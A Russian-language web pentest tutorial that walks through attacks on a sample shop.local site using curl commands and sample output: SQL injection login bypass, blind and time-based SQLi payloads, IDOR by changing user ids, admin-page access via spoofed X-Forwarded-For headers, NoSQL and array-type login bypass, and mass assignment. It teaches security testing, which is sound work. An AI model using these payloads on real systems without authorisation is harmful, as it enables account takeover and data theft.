## Задача

У нас есть карта сайта из фаззинга. Но карта — не цель: пора **заходить в классы уязвимостей**. Два самых результативных семейства — **контроль доступа** (IDOR/BOLA) и **инъекции** (SQLi). Оба проверяются буквально парой запросов, если правильно подойти.

Разберём один сайт: найдём форму входа и пройдёмся по обеим дверям.

## Наш пример: формы и API из карты

После фаззинга у нас есть список путей:

```bash
$ cat paths.txt
/login
/api/v1/users
/api/v1/products
/admin
```

`/login` — точка входа, `/api/v1/users` — API, `/admin` — админка. Начнём с входа.

## Шаг 1: проверяем форму входа на SQLi

Смотрим, как отправляется логин:

```bash
$ curl -s -d 'user=admin&pass=x' https://shop.local/login
{"error":"invalid_credentials"}
```

Подставим кавычку — детектор SQLi:

```bash
$ curl -s -d "user=admin'&pass=x" https://shop.local/login
{"error":"sql_error_near_line1"} 
```

Сервер вернул SQL-ошибку — значит, ввод попадает в запрос. Классический обход аутентификации:

```bash
$ curl -s -d "user=admin'-- -&pass=x" https://shop.local/login
{"status":"ok","token":"eyJ..."}
```

`'-- -` закомментировал проверку пароля. Мы вошли как `admin`. Это **SQLi-аутентификация** — самая частая точка входа.

## Шаг 2: заходим в контроль доступа

С токеном смотрим API пользователей:

```bash
$ curl -s -H 'Authorization: Bearer eyJ...' https://shop.local/api/v1/users/1
{"id":1,"email":"admin@shop.local","role":"admin"}
```

Меняем `1` на `2`:

```bash
$ curl -s -H 'Authorization: Bearer eyJ...' https://shop.local/api/v1/users/2
{"id":2,"email":"bob@shop.local","role":"user"}
```

Читаем чужой профиль — это **IDOR/BOLA**. Заметь: здесь даже не нужен SQLi, достаточно подмены идентификатора. Именно поэтому контроль доступа — первая дверь для проверки.

## Шаг 3: проверяем вертикальную эскалацию

`/admin` вернул 403, но проверим, не решается ли доступ заголовком:

```bash
$ curl -s -H 'X-Forwarded-For: 127.0.0.1' https://shop.local/admin -o /dev/null -w '%{http_code}\n'
200
$ curl -s -H 'X-Original-URL: /admin' https://shop.local/ -o /dev/null -w '%{http_code}\n'
200
```

`X-Forwarded-For: 127.0.0.1` притворился локальным — доступ к админке открыт. Это **вертикальный обход контроля доступа**: проверка «свой ли IP» доверяет заголовку, который присылает клиент.

## Шаг 4: почему эти два класса — вход

- **Контроль доступа** проверяется изменением идентификатора или заголовка — без сложных payload.
- **Инъекции** проверяются кавычкой и разделителем — тоже без инфраструктуры.
- Оба дают **прямой** результат: доступ к данным или RCE.
- Остальные классы (XSS, SSRF, десериализация) требуют контекста; эти — нет.

Поэтому в любом пентесте сначала идут по этим двум дверям.

## Шаг 5: как не утонуть

- **Список точек:** все формы, API, параметры-идентификаторы из карты.
- **По одной двери:** сначала IDOR (меняем id), потом инъекции (кавычка/разделитель).
- **Фиксируй:** каждый запрос и ответ — доказательство находки.
- **Расширяй:** если нашёл SQLi, проверь ту же точку на второе семейство.

## Если не сработало

- **Вход без ошибок** — попробуй boolean-blind (`' AND 1=1--` vs `' AND 1=2--`) или time-based (`';SELECT pg_sleep(5)--`).
- **API отдаёт 401** — проверь, нужен ли токен, и добудь его через регистрацию.
- **IDOR закрыт** — ищи обход через другой эндпоинт (`?id=`, заголовок `X-UserId`).
- **Админка закрыта** — проверь поддомен `admin.shop.local`, порт, или путь `/.git` для утечки.

## Что мы теперь знаем

- От карты переходим к двум дверям: контроль доступа и инъекции.
- SQLi в логине проверяется кавычкой и `'-- -`.
- IDOR проверяется подменой идентификатора в API.
- Вертикальный обход — заголовки (`X-Forwarded-For`, `X-Original-URL`), которым доверяет сервер.

## Частые вопросы

**Почему начинают именно с контроля доступа и инъекций?** Потому что они дают **прямой** результат (доступ к данным или RCE) и проверяются без специального контекста — парой запросов. Остальные классы требуют больше подготовки.

**Что важнее — найти много мелочей или одну серьёзную?** Одна серьёзная. Отчёт ценят за **влияние**, а не за количество. IDOR и SQLi почти всегда «серьёзные».

**Как не сломать продакшен при проверке?** Не запускай `DROP`, не меняй данные без нужды. Для инъекций используй детекторы (`'`, `AND 1=1`) и time-based, а не деструктивные payload.

**С чего начать, если нет ни логина, ни API?** С регистрации: создай аккаунт, получи токен/сессию — и те же две двери открываются для твоего пользователя.

**Нашёл SQLi — что дальше?** Зафиксируй доказательство (данные), проверь ту же точку на второе семейство (IDOR) и оцени влияние: что за данные ты получил.

## Ещё один сценарий: обход аутентификации через массив

Иногда проверка логина сравнивает тип данных нестрого. Подставим массив вместо строки:

```bash
$ curl -s 'https://shop.local/api/login' -H 'Content-Type: application/json' \
  -d '{"user":"admin","pass":["x"]}'
{"status":"ok","token":"eyJ..."}
```

Массив `["x"]` в некоторых фреймворках превращается в `true` при сравнении — пароль «совпал». Родственный приём — `{"pass":{"$ne":null}}` (NoSQL).

Ещё вариант — **обход через параметры**:

```bash
$ curl -s -d 'user=admin&pass=x&is_admin=1' https://shop.local/login
{"status":"ok","role":"admin"}
```

Приложение приняло лишнее поле `is_admin` — массовое присваивание в логине.

## На что смотреть дальше

- **Кавычка и комментарий.** `'`, `'-- -`, `"` — детектор SQLi в логине.
- **Типы данных.** Массив/объект вместо строки ломает нестрогое сравнение.
- **Лишние поля.** `is_admin`, `role`, `debug` — массовое присваивание.
- **IDOR.** Меняй id в API после входа — проверь чужой объект.
- **Заголовки доступа.** `X-Forwarded-For`, `X-Original-URL`, `X-UserId`.
- **Доказательство.** Всегда фиксируй, что получил (данные/доступ), а не «обошёл».
